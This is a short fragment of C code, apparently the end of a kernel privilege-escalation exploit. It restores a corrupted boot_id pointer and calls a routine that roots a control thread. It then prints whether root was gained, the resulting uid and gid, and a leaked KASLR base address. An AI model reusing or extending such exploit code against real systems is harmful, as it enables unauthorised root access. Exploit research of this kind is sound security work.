  if (slide_only) {
    int restored = !boot_id_needs_restore || restore_boot_id_pointer();
    boot_id_needs_restore = 0;
    return restored ? 0 : 1;
  }

  int rooted = root_control_thread();
  alarm(0);
  pr_success("songyuan-final rooted=%d uid=%d gid=%d base=%016llx\n",
             rooted, atomic_load(&control_uid), atomic_load(&control_gid),
             (unsigned long long)kaslr_base);
  return rooted ? 0 : 1;
}
